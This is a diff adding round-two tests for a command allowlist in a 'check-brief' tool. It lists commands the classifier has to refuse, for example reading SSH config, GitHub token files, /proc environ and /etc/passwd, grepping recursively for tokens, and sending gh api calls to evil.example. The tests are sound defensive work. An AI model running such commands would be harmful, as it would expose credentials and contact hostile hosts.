@@ -6,6 +6,7 @@ import {
   mkdtempSync,
   readFileSync,
   rmSync,
+  symlinkSync,
   writeFileSync,
 } from "node:fs";
 import { execFileSync } from "node:child_process";
@@ -462,6 +463,8 @@ describe("check-brief round 1: allowlist holes", () => {
       "core.pager=cat",
       "-c",
       "diff.external=",
+      "-c",
+      "log.showSignature=false",
       "log",
       "--no-textconv",
       "--no-ext-diff",
@@ -663,5 +666,175 @@ describe("check-brief round 1: paths and wiring", () => {
       encoding: "utf8",
     });
     expect(out).toMatch(/\| 1 \| PASS \|/);
+  });
+});
+
+// ── Review round 2 (2026-10-21): each case below reproduced a defect first. ──
+
+describe("check-brief round 2: flag allowlists and confinement to --cwd", () => {
+  it.each([
+    // rg runs --hostname-bin to fill {host}.
+    "rg --hyperlink-format=file://{host}{path} --hostname-bin=./x.sh a",
+    // Outside --cwd, however it is spelled.
+    "grep -q gho_ /root/.config/gh/hosts.yml",
+    "cat /root/.ssh/config",
+    "cat ../../proc/self/environ",
+    "cat /./proc/1/environ",
+    // Options outside each tool's grammar.
+    "head -c 1 notes.txt",
+    "grep -R TOKEN .",
+    "grep -rq PRISMIC_TOKEN=ab .",
+    "rg -uuu TOKEN",
+    "rg -uu -c TOKEN= .",
+    "rg --hidden TOKEN",
+    "ls -R",
+    "wc --files0-from=list",
+    // git: programs from config, and reads outside the repo.
+    "git cat-file --filters --path=a HEAD:b",
+    "git log --show-signature",
+    "git grep --no-index foo /root",
+    "git diff --no-index a b",
+    "git blame --contents=x f",
+    "git grep -f /etc/passwd x",
+    // npm and gh aimed at another host.
+    "npm view x --registry=http://127.0.0.1:1",
+    "npm view x --userconfig=a",
+    "npm view",
+    "gh api https://evil.example/x",
+    "gh api //evil.example/x",
+  ])("refuses %s", (cmd) => {
+    expect(classifyCommand(cmd, scratch).ok).toBe(false);
+  });
+
+  it.each([
+    "grep -c x src/util/credentials.ts",
+    "ls src/lib/server/secrets.ts",
+    "grep -c MANTIS .env.example",
+    "head -n 5 README.md",
+    "head -5 README.md",
+    "tail -n +3 README.md",
+    "rg -c foo",
+    "grep -cF foo -- -weird-name.txt",
+    "npm view react version",
+  ])("allows %s (a real brief would cite it)", (cmd) => {
+    expect(classifyCommand(cmd, scratch).ok).toBe(true);
+  });
+
+  it("a symlink inside --cwd that points outside is refused", () => {
+    const dir = join(scratch, "symlink");
+    mkdirSync(dir, { recursive: true });
+    const target = join(scratch, "outside.txt");
+    writeFileSync(target, "x\n");
+    try {
+      symlinkSync(target, join(dir, "inside.txt"));
+    } catch {
+      // already there from an earlier run
+    }
+    expect(classifyCommand("cat inside.txt", dir).ok).toBe(false);
+    expect(classifyCommand("cat outside.txt", scratch).ok).toBe(true);
+  });
+});
+
+describe("check-brief round 2: verdicts", () => {
+  it("a control chain resolves from the end: no absence keeps PASS over a failed control", async () => {
+    const path = writeBrief(scratch, [
+      "- FOO is absent — `env-set FOO` → exit 1",
+      "- Control: BAR is not missing — `env-set BAR` → exit 0",
+      "- Control: baz — `env-set BAZ` → exit 0",
+    ]);
+    const r = await runCheckBrief(path, { cwd: scratch }, { exec: noExec, env: { BAR: "x" } });
+    expect(r.results.map((x) => x.status)).toEqual(["COULD NOT RUN", "COULD NOT RUN", "FAIL"]);
+  });
+
+  it("a [laptop] control downgrades its absence line too (surviving mutation M3)", async () => {
+    const path = writeBrief(scratch, [
+      "- FOO is absent — `env-set FOO` → exit 1",
+      "- Control: the repo answers — `gh api repos/o/r` → exit 0 [laptop]",
+    ]);
+    const r = await runCheckBrief(path, { cwd: scratch }, { exec: noExec, env: {} });
+    expect(r.results.map((x) => x.status)).toEqual(["COULD NOT RUN", "NOT RUN"]);
+  });
+
+  it("a local tool's stderr naming E403-notes.md is a FAIL, not a refusal", async () => {
+    const path = writeBrief(scratch, ["- The notes are there — `ls E403-notes.md` → exit 0"]);
+    const r = await runCheckBrief(path, { cwd: scratch }, { env: { PATH: process.env.PATH } });
+    expect(r.results.map((x) => x.status)).toEqual(["FAIL"]);
+    expect(r.code).toBe(1);
+  });
+
+  it("a passing gh run stays PASS whatever its stderr says (surviving mutation M4)", async () => {
+    const { exec } = fakeExec({ code: 0, stdout: "ok", stderr: "warning: HTTP 403 once" });
+    const path = writeBrief(scratch, ["- It answers — `gh api repos/o/r` → exit 0"]);
+    const r = await runCheckBrief(path, { cwd: scratch }, { exec, env: {} });
+    expect(r.results.map((x) => x.status)).toEqual(["PASS"]);
+  });
+
+  it("'1.0' is not a token of 'v22.1.0', but '0' still ends a sentence", () => {
+    expect(containsToken("v22.1.0\n", "1.0")).toBe(false);
+    expect(containsToken("v22.1.0\n", "v22.1.0")).toBe(true);
+    expect(containsToken("count: 0.\n", "0")).toBe(true);
+  });
+
+  it("'Positive control:' pairs like 'Control:' (surviving mutation M10)", () => {
+    const p = parseBrief(
+      "**Verify first.**\n\n- The flag is missing — `ls` → exit 1\n- Positive control: a word — `ls` → exit 0\n",
+    );
+    expect(p.warnings.join("\n")).not.toMatch(/no positive control/);
+  });
+});
+
+describe("check-brief round 2: sections and fences", () => {
+  it("a template quoted in a fence is not a live section, and the prose after it is still checked", () => {
+    const p = parseBrief(
+      [
+        "The template:",
+        "",
+        "```md",
+        "**Verify first.**",
+        "- x — `ls nope` → exit 0",
+        "```",
+        "",
+        "**Start here.** FOO_BAR is missing from #12.",
+      ].join("\n"),
+    );
+    expect(p.lines).toEqual([]);
+    const w = p.warnings.join("\n");
+    expect(w).toContain("FOO_BAR");
+    expect(w).toContain("#12");
+    expect(w).toMatch(/absence phrase not covered/);
+  });
+
+  it("an unclosed fence says that nothing after it was read", () => {
+    const p = parseBrief(
+      "**Verify first.**\n\n- a — `ls` → exit 0\n\n```sh\nls\n\n**Start here.** MANTIS_PRISMIC is absent.\n- b — `ls` → exit 0\n",
+    );
+    expect(p.lines.map((l) => l.claim)).toEqual(["a"]);
+    expect(p.warnings.join("\n")).toMatch(/code fence opened on line 5 never closes/);
+  });
+
+  it("'**Start here:**' ends the section like '**Start here.**'", () => {
+    const p = parseBrief(
+      "**Verify first.**\n\n- a — `ls` → exit 0\n\n**Start here:**\n\nRun `x` — `ls` → exit 0\n",
+    );
+    expect(p.lines.map((l) => l.claim)).toEqual(["a"]);
+  });
+
+  it("a heading ends the section (surviving mutation M6)", () => {
+    const p = parseBrief(
+      "**Verify first.**\n\n- a — `ls` → exit 0\n\n## Notes\n\nb — `ls` → exit 0\n",
+    );
+    expect(p.lines.map((l) => l.claim)).toEqual(["a"]);
+  });
+
+  it("reads a '1)' list (surviving mutation M5)", () => {
+    const p = parseBrief("**Verify first.**\n\n1) a — `ls` → exit 0\n2) b — `ls` → exit 0\n");
+    expect(p.lines.map((l) => l.claim)).toEqual(["a", "b"]);
+  });
+
+  it("a second lead-in line never joins the item before it (surviving mutation M7)", () => {
+    const p = parseBrief(
+      "**Verify first.**\n- a — `ls` → exit 0\n**Verify first.** b — `ls` → exit 0\n",
+    );
+    expect(p.lines.map((l) => l.claim)).toEqual(["a", "b"]);
   });
 });
